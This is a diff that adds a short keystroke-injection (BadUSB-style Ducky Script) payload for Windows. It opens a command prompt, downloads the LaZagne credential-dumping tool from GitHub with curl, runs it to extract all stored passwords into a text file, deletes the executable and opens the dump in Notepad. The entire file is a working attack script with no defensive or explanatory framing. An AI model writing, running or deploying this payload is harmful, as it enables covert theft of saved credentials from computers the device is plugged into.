@@ -1,0 +1,12 @@
+GUI r
+DELAY 750
+STRING cmd
+ENTER
+DELAY 1500
+STRING curl -sSLo %TEMP%\LaZagne.exe https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/LaZagne.exe && %TEMP%\LaZagne.exe all > .\LZg.txt && del %TEMP%\LaZagne.exe
+DELAY 5000
+ENTER
+DELAY 1000 
+STRING notepad LZg.txt
+
+
